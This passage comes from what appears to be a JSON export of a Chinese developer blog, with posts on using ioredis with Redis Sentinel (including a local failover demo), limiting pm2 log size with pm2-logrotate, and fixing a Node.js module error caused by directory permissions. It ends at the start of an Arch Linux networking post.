\u5730\u5740\u8fde\u63a5Redis\u5b9e\u4f8b\uff0c\n\u8fd8\u8981\u63a5\u6536 <code>Sentinel<\/code> \u7684 <code>Master<\/code> <code>Slave<\/code> \u53d8\u52a8\u901a\u77e5\uff0c\u91cd\u8fdeRedis\u5b9e\u4f8b\u3002\n<\/p>\n\n<p>\n\u4e0d\u5e78\u7684\u662f\uff0c<a href=\"https:\/\/github.com\/NodeRedis\/node_redis\">node_redis<\/a> \u6a21\u5757\u53ea\u652f\u6301\u5355\u5b9e\u4f8bredis\uff0c\u57fa\u4e8e <a href=\"https:\/\/github.com\/NodeRedis\/node_redis\">node_redis<\/a> \u5b9e\u73b0\u4e0e <code>Sentinel<\/code> \u7684\u4ea4\u4e92\u5de5\u4f5c\u91cf\u6bd4\u8f83\u5927\u3002\n<\/p>\n\n<p>\n\u6240\u5e78\u7684\u662f <a href=\"http:\/\/github.com\/luin\/ioredis\/\">ioredis<\/a> \uff08\u73b0\u5df2\u6210\u4e3aredis\u5b98\u65b9\u63a8\u8350\u6a21\u5757\uff09\u51fa\u73b0\u4e86\uff0c\u5b83\u652f\u6301 <code>Sentinel<\/code> \uff0c\u800c\u4e14\u5927\u90e8\u5206API\u8ddf <a href=\"https:\/\/github.com\/NodeRedis\/node_redis\">node_redis<\/a> \u662f\u517c\u5bb9\u7684:\n<\/p>\n\n<blockquote>\n<p>\nioredis is a robust, full-featured Redis client that is used in the world's biggest online commerce company Alibaba and many other awesome companies.\n<\/p>\n\n<ol class=\"org-ol\">\n<li>Full-featured. It supports Cluster, Sentinel, Pipelining and of course Lua scripting &amp; Pub\/Sub (with the support of binary messages).\n<\/li>\n<li>High performance.\n<\/li>\n<li>Delightful API. It works with Node callbacks and Bluebird promises.\n<\/li>\n<li>Transformation of command arguments and replies.\n<\/li>\n<li>Transparent key prefixing.\n<\/li>\n<li>Abstraction for Lua scripting, allowing you to define custom commands.\n<\/li>\n<li>Support for binary data.\n<\/li>\n<li>Support for TLS.\n<\/li>\n<li>Support for offline queue and ready checking.\n<\/li>\n<li>Support for ES6 types, such as Map and Set.\n<\/li>\n<li>Support for GEO commands (Redis 3.2 Unstable).\n<\/li>\n<li>Sophisticated error handling strategy.\n<\/li>\n<\/ol>\n<\/blockquote>\n\n<p>\n<a href=\"http:\/\/github.com\/luin\/ioredis\/\">ioredis<\/a> \u63d0\u4f9b\u4e86\u4ece <a href=\"https:\/\/github.com\/NodeRedis\/node_redis\">node_redis<\/a> \u8fdb\u884c\u8fc1\u79fb\u7684\u6587\u6863 <a href=\"https:\/\/github.com\/luin\/ioredis\/wiki\/Migrating-from-node_redis\">Migrating from node_redis<\/a> \u3002\n<\/p>\n\n<p>\n\u4f46\u4e5f\u8981\u6ce8\u610f <a href=\"http:\/\/github.com\/luin\/ioredis\/\">ioredis<\/a> \u7684\u4e0d\u540c\u4e4b\u5904\uff0c\u5982\u8fde\u63a5 <code>Redis<\/code> \u5931\u8d25\u65f6\uff0c <a href=\"https:\/\/github.com\/NodeRedis\/node_redis\">node_redis<\/a> \u9ed8\u8ba4\u662f\u4e0d\u91cd\u8fde\uff0c\u800c <a href=\"http:\/\/github.com\/luin\/ioredis\/\">ioredis<\/a> \u4f1a\u91cd\u8fde\uff0c\u5728 <code>redis<\/code> \u6545\u969c\u65f6\u53ef\u80fd\u5bfc\u81f4 <code>node.js<\/code> \u79ef\u538b\u5927\u91cf\u8bf7\u6c42\u8017\u5c3d\u5185\u5b58\u3002\n<\/p>\n\n<p>\n\u53c2\u8003\u6587\u6863 <a href=\"https:\/\/github.com\/luin\/ioredis\/blob\/master\/README.md#sentinel\">ioredis Sentinel<\/a> \uff0c\u5c06\u4e0a\u4e00\u8282 <code>\u8bbf\u95ee\u5355\u5b9e\u4f8bnode.js<\/code> \u4e2dredis\u5c01\u88c5\u4ee3\u7801\u6539\u6210\u652f\u6301 <code>Sentinel<\/code>\n<\/p>\n<\/div>\n\n<div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\">database.js<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">Redis<\/span> = require(<span style=\"color: #66cccc;\">'ioredis'<\/span>);\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">Database<\/span>() {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">self<\/span> = <span style=\"color: #6699cc;\">this<\/span>;\n\n<span style=\"background-color: #515151;\"> <\/span>   self._redis_options = {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   name: <span style=\"color: #66cccc;\">'mymaster'<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   sentinels: [{\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   host: <span style=\"color: #66cccc;\">'127.0.0.1'<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   port: 5000\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }, {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   host: <span style=\"color: #66cccc;\">'127.0.0.1'<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   port: 5001\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }],\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   db: 2\n<span style=\"background-color: #515151;\"> <\/span>   };\n\n<span style=\"background-color: #515151;\"> <\/span>   self._redis = <span style=\"color: #6699cc;\">null<\/span>;\n}\n\nDatabase.<span style=\"color: #6699cc;\">prototype<\/span>.redis = <span style=\"color: #99cc99;\">function<\/span>(<span style=\"color: #ffcc66;\">callback<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">self<\/span> = <span style=\"color: #6699cc;\">this<\/span>;\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span><span style=\"color: #99cc99;\">if<\/span> (! self._redis) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   self._redis = <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">Redis<\/span>(self._redis_options);\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> callback(<span style=\"color: #6699cc;\">null<\/span>, self._redis);\n};\n\nmodule.exports = <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">Database<\/span>();\n<\/pre>\n<\/div>\n\n<p>\n\u548c\u4f7f\u7528 <a href=\"https:\/\/github.com\/NodeRedis\/node_redis\">node_redis<\/a> \u7684 <code>database.js<\/code> \u5bf9\u7167\u4e00\u4e0b\uff0c\u53ef\u4ee5\u53d1\u73b0 <a href=\"http:\/\/github.com\/luin\/ioredis\/\">ioredis<\/a> \u8fde\u63a5 <code>redis<\/code> \u65f6\uff0c\u652f\u6301 <code>db<\/code> \u9009\u9879\uff0c\u53ef\u4ee5\u7701\u53bb\u8c03\u7528 <code>select<\/code> \u3002\n<\/p>\n\n<p>\n\u503c\u5f97\u6ce8\u610f\u7684\u662f <a href=\"https:\/\/github.com\/NodeRedis\/node_redis\">node_redis<\/a> \u6700\u8fd1\u5f00\u59cb\u652f\u6301\u8fde\u63a5 <code>redis<\/code> \u65f6\u6307\u5b9a <code>db<\/code> \u9009\u9879\uff0c\u89c1 <a href=\"https:\/\/github.com\/NodeRedis\/node_redis\/commit\/a4285c156c5b8964d92a36bd7f361a6f40e2449a\">Parse redis url just like IANA \u00b7 NodeRedis\/node_redis@a4285c1<\/a> \uff0c\n\u4f7f\u7528\u8be5\u7279\u6027\u65f6\u8bf7\u5b89\u88c5\u6700\u65b0\u7248\u7684 <a href=\"https:\/\/github.com\/NodeRedis\/node_redis\">node_redis<\/a> \u3002\n<\/p>\n\n<blockquote>\n<p>\ndb: null; If set, client will run redis select command on connect. This is not recommended.\n<\/p>\n<\/blockquote>\n<p>\n\u5f15\u7528\u81ea <a href=\"https:\/\/github.com\/NodeRedis\/node_redis#rediscreateclient\">redis.createClient()\u6587\u6863<\/a>\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\">\u542f\u52a8 Redis \u53ca Sentinel<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<p>\n\u542f\u52a8\u4e0a\u4e00\u7bc7\u6587\u7ae0\u300a <a href=\"http:\/\/blog.kankanan.com\/article\/redis-9ad853ef7528602765b96848ff1a-sentinel.html\">redis\u9ad8\u53ef\u7528\u6027\u65b9\u6848\uff1aSentinel<\/a> \u300b\u914d\u7f6e\u597d\u7684 <code>Sentinel<\/code>\n<\/p>\n\n<ul class=\"org-ul\">\n<li><code>Master<\/code> <code>redis-server .\/redis-master.conf<\/code> \n<\/li>\n\n<li><code>Slave<\/code> <code>redis-server .\/redis-slave.conf<\/code>\n<\/li>\n\n<li><code>Sentinel a<\/code> <code>redis-sentinel .\/redis-sentinel-a.conf<\/code>\n<\/li>\n\n<li><code>Sentinel b<\/code> <code>redis-sentinel .\/redis-sentinel-b.conf<\/code>\n<\/li>\n\n<li><code>Sentinel c<\/code> <code>redis-sentinel .\/redis-sentinel-c.conf<\/code>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2-3\" class=\"outline-3\">\n<h3 id=\"sec-2-3\">\u6f14\u793a\u8fd0\u884c<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-3\">\n<p>\n\u8fd0\u884c\u6f14\u793a\u811a\u672c\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span id=\"coderef-master_write\" class=\"coderef-off\"><span class=\"linenr\">1: <\/span>node client.js &amp;<\/span>\n<span id=\"coderef-wait_sync\" class=\"coderef-off\"><span class=\"linenr\">2: <\/span>sleep 1<\/span>\n<span id=\"coderef-slave_read\" class=\"coderef-off\"><span class=\"linenr\">3: <\/span>redis-cli -p 6380 -n 2 get hello<\/span>\n<span id=\"coderef-failover\" class=\"coderef-off\"><span class=\"linenr\">4: <\/span>redis-cli -p 6379 debug sleep 30 &amp;<\/span>\n<\/pre>\n<\/div>\n\n<dl class=\"org-dl\">\n<dt> \u884c <a href=\"#coderef-master_write\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-master_write');\" onmouseout=\"CodeHighlightOff(this, 'coderef-master_write');\">1<\/a> <\/dt><dd>\u8fd0\u884c <code>client.js<\/code> \u5728 <code>Master<\/code> \u5199\u5165\u952e\u503c\n<\/dd>\n\n<dt> \u884c <a href=\"#coderef-wait_sync\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-wait_sync');\" onmouseout=\"CodeHighlightOff(this, 'coderef-wait_sync');\">2<\/a> <\/dt><dd>\u7b49\u5f85 <code>Master<\/code> \u540c\u6b65\u6570\u636e\u5230 <code>Slave<\/code>\n<\/dd>\n\n<dt> \u884c <a href=\"#coderef-slave_read\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-slave_read');\" onmouseout=\"CodeHighlightOff(this, 'coderef-slave_read');\">3<\/a> <\/dt><dd>\u4ece <code>Slave<\/code> \u8bfb\u53d6\u952e\u503c\n<\/dd>\n\n<dt> \u884c <a href=\"#coderef-failover\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-failover');\" onmouseout=\"CodeHighlightOff(this, 'coderef-failover');\">4<\/a> <\/dt><dd>\u89e6\u53d1\u6545\u969c\u5207\u6362\n<\/dd>\n<\/dl>\n\n<p>\n\u6f14\u793a\u811a\u672c\u8fd0\u884c\u7ed3\u679c\n<\/p>\n\n<pre class=\"example\">\n<span id=\"coderef-slave_read_result\" class=\"coderef-off\"><span class=\"linenr\">5: <\/span>\"world\"<\/span>\n<span id=\"coderef-slave_read_status\" class=\"coderef-off\"><span class=\"linenr\">6: <\/span>OK<\/span>\n<span id=\"coderef-master_read\" class=\"coderef-off\"><span class=\"linenr\">7: <\/span>hello: world<\/span>\n<\/pre>\n\n<dl class=\"org-dl\">\n<dt> \u884c <a href=\"#coderef-slave_read_result\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-slave_read_result');\" onmouseout=\"CodeHighlightOff(this, 'coderef-slave_read_result');\">5<\/a> <\/dt><dd>\u6f14\u793a\u811a\u672c\u884c <a href=\"#coderef-slave_read\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-slave_read');\" onmouseout=\"CodeHighlightOff(this, 'coderef-slave_read');\">3<\/a> \u7684redis\u547d\u4ee4\u6267\u884c\u7ed3\u679c\n<\/dd>\n\n<dt> \u884c <a href=\"#coderef-slave_read_status\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-slave_read_status');\" onmouseout=\"CodeHighlightOff(this, 'coderef-slave_read_status');\">6<\/a> <\/dt><dd>\u6f14\u793a\u811a\u672c\u884c <a href=\"#coderef-slave_read\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-slave_read');\" onmouseout=\"CodeHighlightOff(this, 'coderef-slave_read');\">3<\/a> \u7684redis\u547d\u4ee4\u6267\u884c\u72b6\u6001\n<\/dd>\n\n<dt> \u884c <a href=\"#coderef-master_read\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-master_read');\" onmouseout=\"CodeHighlightOff(this, 'coderef-master_read');\">7<\/a> <\/dt><dd>\u6f14\u793a\u811a\u672c\u884c <a href=\"#coderef-master_write\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-master_write');\" onmouseout=\"CodeHighlightOff(this, 'coderef-master_write');\">1<\/a> \u540e\u53f0\u8fd0\u884c\u7ed3\u675f\u65f6\u8f93\u51fa\u7684\u952e\u503c\uff0c\u6b64\u65f6\u7531\u4e8e\u4e3b\u5907\u5df2\u5207\u6362\uff0c\u662f\u4ece\u65b0\u7684 <code>Master<\/code> \uff08\u539f <code>Slave<\/code> \uff09\u4e0a\u83b7\u53d6\u7684\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u53c2\u8003<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<a href=\"https:\/\/github.com\/luin\/ioredis\/blob\/master\/README.md#sentinel\">ioredis Sentinel<\/a><\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u63a7\u5236pm2\u7684\u65e5\u5fd7\u6587\u4ef6\u5927\u5c0f",
  "timestamp": "2015-12-25 18:41:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n\u4e0b\u73ed\u524d\u53d1\u73b0\u7ebf\u4e0a\u670d\u52a1\u5668\u7684 <code>100G<\/code> \u78c1\u76d8\u53ea\u6709 <code>10%<\/code> \u7a7a\u95f2\u7a7a\u95f4\u4e86\uff0c\u68c0\u67e5\u4e86\u4e00\u4e0b\u662f <code>pm2<\/code> \u7684\u65e5\u5fd7\u6587\u4ef6\uff08\u5728 <code>~\/.pm2\/logs<\/code> \u76ee\u5f55\u4e0b\uff09\u5360\u7528\u7684\u3002\n<\/p>\n\n<p>\n\u53c2\u8003\u5e16\u5b50 <a href=\"https:\/\/github.com\/Unitech\/pm2\/issues\/535\">Limit logs size? \u00b7 Issue #535 \u00b7 Unitech\/pm2<\/a> \u5b89\u88c5 <a href=\"https:\/\/www.npmjs.com\/package\/pm2-logrotate\">pm2-logrotate<\/a> <code>pm2 install pm2-logrotate<\/code> \uff0c\n<\/p>\n\n<p>\n\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u89c2\u5bdf\u5230\u6b63\u5728\u6309\u65f6\u95f4\u5207\u5206\u6210\u591a\u4e2a\u65e5\u5fd7\u6587\u4ef6\uff0c\u4f46\u7a7a\u95f2\u7a7a\u95f4\u5728\u8fc5\u901f\u51cf\u5c11\uff0c\u773c\u770b\u5c31\u8981\u4f4e\u4e8e <code>5%<\/code> \u4e86\uff0c\u8981\u662f\u78c1\u76d8\u6ee1\u4e86\u4f1a\u5f71\u54cd\u5173\u952e\u7684 <code>redis<\/code> \u6570\u636e\u5e93\uff0c\n<\/p>\n\n<p>\n\u7acb\u5373\u624b\u5de5\u5c06\u65e5\u5fd7\u6587\u4ef6\u5168\u90e8\u5220\u9664\uff0c\u4f46\u662f\u78c1\u76d8\u7a7a\u95f2\u7a7a\u95f4\u5728\u7ee7\u7eed\u51cf\u5c11\uff0c\u660e\u767d\u662f <code>pm2<\/code> \u6216\u8005 <code>pm2-logrotate<\/code> \u6253\u5f00\u4e86\u65e5\u5fd7\u6587\u4ef6\u5bfc\u81f4\u7a7a\u95f4\u65e0\u6cd5\u91ca\u653e\uff0c\n<\/p>\n\n<p>\n\u7acb\u5373\u6267\u884c <code>pm2 kill<\/code> \uff0c \u7b49 <code>crontab<\/code> \u5c06\u670d\u52a1\u91cd\u65b0\u62c9\u8d77\uff0c\u4e00\u5206\u949f\u540e\u786e\u8ba4\u5371\u673a\u89e3\u51b3\u3002\u597d\u5728\u8fd9\u53f0\u670d\u52a1\u5668\u4e0a\u7684 <code>node.js<\/code> \u670d\u52a1\u90fd\u4e0d\u662f\u5f88\u5173\u952e\uff0c\n<\/p>\n\n<p>\n\u6ca1\u6709\u9020\u6210\u592a\u5927\u5f71\u54cd\uff0c\u5723\u8bde\u8282\u5feb\u4e50:)\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u4eca\u5929\uff082016-02-16\uff09\u8fd0\u7ef4\u4eba\u5458\u53d1\u73b0pm2\u7684\u65e5\u5fd7\u5feb\u5360\u6ee1\u78c1\u76d8<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n<a href=\"https:\/\/www.npmjs.com\/package\/pm2-logrotate\">pm2-logrotate<\/a> \uff08\u5f53\u524d\u7248\u672c\u4e3a1.3.1\uff09 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5e76\u672a\u9650\u5236\u65e5\u5fd7\u6587\u4ef6\u6570\uff0c\u65e7\u7684\u65e5\u5fd7\u6587\u4ef6\u672a\u81ea\u52a8\u5220\u9664\u91ca\u653e\u7a7a\u95f4\uff0c\u9700\u8981\u8bbe\u7f6e retain \u914d\u7f6e\u9879\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">pm2 set pm2-logrotate:retain 100\n<\/pre>\n<\/div>\n\n<p>\n\u8fd9\u6837\u6700\u591a\u4f1a\u4fdd\u7559 100 \u4e2a\u65e5\u5fd7\u6587\u4ef6\u3002\n<\/p>\n\n<p>\nmax_size \u914d\u7f6e\u9879\u9ed8\u8ba4\u662f 10MB\uff0c\u5e76\u4e0d\u610f\u5473\u7740\u5207\u5272\u51fa\u6765\u7684\u65e5\u5fd7\u6587\u4ef6\u5927\u5c0f\u4e00\u5b9a\u5c31\u662f 10MB\uff0c\u800c\u662f\u68c0\u67e5\u65f6\u53d1\u73b0\u65e5\u5fd7\u6587\u4ef6\u5927\u5c0f\u8fbe\u5230 max_size\uff0c\u5219\u89e6\u53d1\u65e5\u5fd7\u5207\u5272\u3002\n<\/p>\n\n<p>\ninterval \u548c interval_unit \u914d\u7f6e\u9879\u6307\u5b9a\u4e86\u6309\u65f6\u95f4\u7ef4\u5ea6\u8fdb\u884c\u65e5\u5fd7\u5207\u5272\u3002\n<\/p>\n\n<p>\n\u5207\u5272\u662f\u6307\u5c06\u65e5\u5fd7\u6587\u4ef6\u5185\u5bb9\u79fb\u5230\u540d\u79f0\u4e3a &lt;project name&gt;-out__YYYY-MM-DD-HH-mm.log \u7684\u65e5\u5fd7\u6587\u4ef6\u4e2d\uff0c\u6240\u4ee5\u65e5\u5fd7\u6587\u4ef6\u5927\u5c0f\u5f80\u5f80\u662f\u8d85\u8fc7 max_size \u7684\u3002\n<\/p>\n\n<p>\n\u7531\u4e8e\u9ed8\u8ba4\u914d\u7f6e interval \u4e3a 1\uff0c interval_unit \u4e3a DD\uff0c\u6240\u4ee5\u6bcf\u5929\u81f3\u5c11\u4f1a\u5207\u5272\u4e00\u6b21\u65e5\u5fd7\uff0c\u6bcf\u5206\u949f\u5f53\u53d1\u73b0\u65e5\u5fd7\u5927\u5c0f\u8d85\u8fc7 10MB\uff0c\u4e5f\u4f1a\u89e6\u53d1\u4e00\u6b21\u65e5\u5fd7\u5207\u5272\u3002\n<\/p>\n\n<p>\npm2-logrotate \u73b0\u9636\u6bb5\u5c0f\u95ee\u9898\u8fd8\u662f\u6bd4\u8f83\u591a\u7684\uff08\u8be6\u89c1\u9879\u76ee\u7684 <a href=\"https:\/\/github.com\/pm2-hive\/pm2-logrotate\/issues\">issues<\/a> \uff09\uff0c\u5982\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u65e5\u5fd7\u6587\u4ef6\u65e5\u671f\u59cb\u7ec8\u662f\u524d\u4e00\u5929\uff0c\u65e5\u5fd7\u6587\u4ef6\u5927\u5c0f\u8d85\u8fc7 max_size \u89e6\u53d1\u65e5\u5fd7\u5207\u5272\u65f6\uff0c\u6587\u4ef6\u540d\u4e2d\u7684\u65e5\u671f\u4e5f\u4e3a\u524d\u4e00\u5929\u4e0d\u5408\u7406\u4e86\u3002\n\n<p>\n\u8be6\u89c1 <a href=\"https:\/\/github.com\/pm2-hive\/pm2-logrotate\/issues\/18\">Fast growing log files may be overwritten #18<\/a>\n<\/p>\n<\/li>\n\n<li>\u5982\u679c\u65e5\u5fd7\u6587\u4ef6\u5199\u5f97\u5f88\u5feb\uff0c\u5207\u5272\u65f6\u6709\u53ef\u80fd\u56e0\u4e3a\u65e5\u5fd7\u6587\u4ef6\u540d\u51b2\u7a81\uff0c\u5bfc\u81f4\u540c\u540d\u7684\u65e7\u65e5\u5fd7\u6587\u4ef6\u88ab\u8986\u76d6\u3002\n\n<p>\n\u8be6\u89c1 <a href=\"https:\/\/github.com\/pm2-hive\/pm2-logrotate\/issues\/17\">Rotated files date #17<\/a>\n<\/p>\n<\/li>\n\n<li>pm2 \u5f00\u542f merge_logs \u65f6\uff0c\u65e5\u5fd7\u4f1a\u91cd\u590d\n\n<p>\n\u8be6\u89c1 <a href=\"https:\/\/github.com\/pm2-hive\/pm2-logrotate\/issues\/14\">logrotate rotate the log multiple times if merge_logs is true #14<\/a>\n<\/p>\n<\/li>\n\n<li>\u65e0\u6cd5\u7cbe\u786e\u9650\u5236\u65e5\u5fd7\u5360\u7528\u7a7a\u95f4\u3002\n\n<p>\n\u4e0d\u8fc7 logrotate \u5de5\u5177\u4e5f\u4e0d\u80fd\uff0c\u6240\u4ee5\u4e5f\u4e0d\u7b97\u662f\u4e2a\u4e25\u91cd\u7684\u95ee\u9898\u3002\n<\/p>\n<\/li>\n<\/ul>\n\n<p>\n\u66f4\u597d\u7684\u65b9\u5f0f\u53ef\u80fd\u662f\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684 logrotate \u670d\u52a1\u3002<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u4fee\u590d\u6587\u4ef6\u76ee\u5f55\u6743\u9650\u5f15\u8d77\u7684\u9519\u8bef\uff1aCannot find module",
  "timestamp": "2015-12-28 15:28:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n<code>node.js<\/code> \u5e94\u7528\u90e8\u7f72\u540e\u591a\u6b21\u9047\u5230\u8fd9\u79cd\u9519\u8bef\uff1a\n<\/p>\n\n<pre class=\"example\">\nError: Cannot find module '..\/encodings'\n      at Function.Module._resolveFilename (module.js:338:15)\n      at Function.Module._load (module.js:289:25)\n      at Function._load (\/usr\/local\/www.xxxxxxxx.com\/node_modules\/pm2\/node_modules\/pmx\/lib\/transaction.js:62:21)\n      at Module.require (module.js:366:17)\n      at require (module.js:385:17)\n      at Object.getCodec (\/usr\/local\/www.xxxxxxxx.com\/node_modules\/koa-body\/node_modules\/co-body\/node_modules\/raw-body\/node_modules\/iconv-lite\/lib\/index.js:61:27)\n      at Object.getDecoder (\/usr\/local\/www.xxxxxxxx.com\/node_modules\/koa-body\/node_modules\/co-body\/node_modules\/raw-body\/node_modules\/iconv-lite\/lib\/index.js:118:23)\n      at getDecoder (\/usr\/local\/www.xxxxxxxx.com\/node_modules\/koa-body\/node_modules\/co-body\/node_modules\/raw-body\/index.js:44:18)\n      at readStream (\/usr\/local\/www.xxxxxxxx.com\/node_modules\/koa-body\/node_modules\/co-body\/node_modules\/raw-body\/index.js:218:15)\n      at executor (\/usr\/local\/www.xxxxxxxx.com\/node_modules\/koa-body\/node_modules\/co-body\/node_modules\/raw-body\/index.js:110:5)\n<\/pre>\n\n<p>\n\u4e0b\u610f\u8bc6\u5730\u4ee5\u4e3a\u662f <code>node.js<\/code> \u7248\u672c\u7528\u9519\u4e86\uff08 <code>npm install<\/code> \u548c\u8fd0\u884c\u65f6\u7684 <code>node.js<\/code> \u7248\u672c\u4e0d\u4e00\u81f4\uff09\uff0c\u5220\u9664 <code>node_modules<\/code> \u91cd\u65b0 <code>npm install<\/code> \u540e\u8fd8\u662f\u4e00\u6837\u7684\u95ee\u9898\u3002\n<\/p>\n\n<p>\n\u67e5\u4e86\u4e00\u4e0b\u6e90\u4ee3\u7801\uff0c\u627e\u5230\u4e86\u51fa\u9519\u4f4d\u7f6e <code>node_modules\/koa-body\/node_modules\/co-body\/node_modules\/raw-body\/node_modules\/iconv-lite\/lib\/index.js:61<\/code> \uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">if<\/span> (!iconv.encodings)\n<span style=\"background-color: #515151;\"> <\/span>   iconv.encodings = require(<span style=\"color: #66cccc;\">\"..\/encodings\"<\/span>); <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">Lazy load all encoding definit<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">ions.<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u8fd9\u662f\u5ef6\u8fdf\u52a0\u8f7d\u6a21\u5757\uff0c\u4ee3\u7801\u672c\u8eab\u6ca1\u6709\u9519\uff0c <code>..\/encodings<\/code> \u6a21\u5757\u662f\u5b58\u5728\u7684\uff0c\u4ee5\u524d\u4e5f\u6709\u9047\u5230\u7c7b\u4f3c\u95ee\u9898\uff0c\u4e0d\u8fc7\u662f\u5728 <code>node.js<\/code> \u4e00\u542f\u52a8\u5c31\u62a5\u9519\uff0c\u56e0\u4e3a\u7cfb\u7edf\u9ed8\u8ba4\u7684\u6743\u9650\u592a\u4e25\u683c\u4e86\uff08\u5982\uff1a <code>umask<\/code> \u4e3a <code>0022<\/code> \uff09\uff0c\n<code>npm install<\/code> \u5b89\u88c5\u7684 <code>node_modules<\/code> \u5176\u5b83\u7528\u6237\uff08\u5982\uff1a <code>nobody<\/code> \uff09\u6ca1\u6709\u8bbf\u95ee\u6743\u9650\u3002\u8fd9\u6b21\u662f\u5728\u5904\u7406\u7528\u6237\u8bf7\u6c42\u8fc7\u7a0b\u4e2d\u62a5\u9519\uff0c\u8003\u8651\u5230\u4e0a\u9762\u7684\u6a21\u5757\u662f\u5ef6\u8fdf\u52a0\u8f7d\uff0c\n\u5728\u521d\u59cb\u5316\u5b8c\u6210\u4e0e\u76d1\u542c\u7aef\u53e3\u5904\u7406\u7528\u6237\u8bf7\u6c42\u7684\u4ee3\u7801\u4e4b\u95f4\uff0c\u6211\u7684\u4ee3\u7801\u6709 <code>setuid<\/code> \u5230 <code>nobody<\/code> \u7684\u903b\u8f91\uff0c\u5e94\u8be5\u8fd8\u662f\u6587\u4ef6\u76ee\u5f55\u6743\u9650\u5f15\u8d77\u3002\n<\/p>\n\n<p>\n\u6700\u7ec8\u53d1\u73b0\u662f <code>\/usr\/local\/www.xxxxxxxx.com<\/code> \u5728\u521b\u5efa\u65f6\u56e0\u4e3a\u7cfb\u7edf\u9ed8\u8ba4\u7684\u6743\u9650\u8bbe\u7f6e\u592a\u4e25\u683c\uff08 <code>umask<\/code> \u4e3a <code>0022<\/code> \uff09\uff0c\u5bfc\u81f4 <code>nobody<\/code> \u7528\u6237\u65e0\u6cd5\u8bbf\u95ee\uff0c\u6539\u4e00\u4e0b\u76ee\u5f55\u6743\u9650\u540e\u95ee\u9898\u4fee\u590d\u3002<\/p>\n"
},
{
  "title": "Archlinux\u4e0b\u89e3\u51b3\u4e0a\u7f51\u6162\u95ee\u9898",
  "timestamp": "2015-12-30 10:17:00",
  "tags": [
    "archlinux",
    "network"
  ],
